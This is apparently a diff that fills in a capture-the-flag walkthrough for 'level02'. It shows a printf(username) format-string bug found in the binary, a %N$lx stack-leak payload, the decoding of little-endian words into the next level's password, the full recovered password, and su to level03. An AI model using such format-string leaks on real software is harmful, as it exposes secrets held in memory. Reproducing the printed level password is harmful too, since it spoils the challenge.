@@ -1,19 +1,62 @@
-Level 2 - Walkthrough
-========================
+Level02 - Walkthrough
+=====================
 
 1) Recon
-- Files discovered:
-- Useful commands used:
+--------
+- Connected as `level02` and verified binary path and permissions.
+
+Commands:
+```sh
+whoami
+pwd
+ls -l /home/users/level02/level02
+file /home/users/level02/level02
+```
 
 2) Vulnerability confirmation
-- What is vulnerable:
-- Why it is exploitable:
+-----------------------------
+- Triggered normal failure path with dummy inputs.
+- Reversed binary and identified vulnerable call in failure branch:
+	- `printf(username)`
+- Confirmed format-string leak with short payload:
+```sh
+/home/users/level02/level02 << 'EOF'
+%1$lx.%2$lx.%3$lx.%4$lx.%5$lx.%6$lx.%7$lx.%8$lx.%9$lx.%10$lx
+x
+EOF
+```
 
 3) Exploitation steps
-- Exact command sequence:
-- Payload used:
+---------------------
+Approach used: leak one stack slot per run (`%N$lx`), then decode little-endian 64-bit words.
+
+Educational helper script (wrapper style) used from host notes:
+- `py.py` probes indices `1..80`.
+- Keeps hex-only leaks.
+- Decodes each word with `struct.pack("<Q", value)`.
+- Prints printable chunks and maps index -> text.
+
+Recovered secret chunks:
+- index `22` -> `Hh74RPnu`
+- index `23` -> `Q9sa5JAE`
+- index `24` -> `XgNWCqz7`
+- index `25` -> `sXGnh5J5`
+- index `26` -> `M9KfPg3H`
+
+Concatenated password:
+- `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
 
 4) Result
-- Retrieved next password from:
-- Notes for defense/evaluation:
+---------
+- Used recovered password to switch user:
+```sh
+su level03
+whoami
+```
+
+Notes for defense/evaluation
+----------------------------
+- Explain why `%lx` leaks stack words.
+- Explain little-endian decode (hex word -> bytes -> text).
+- Explain why probing by index is stable and cleaner than very long single payloads.
 
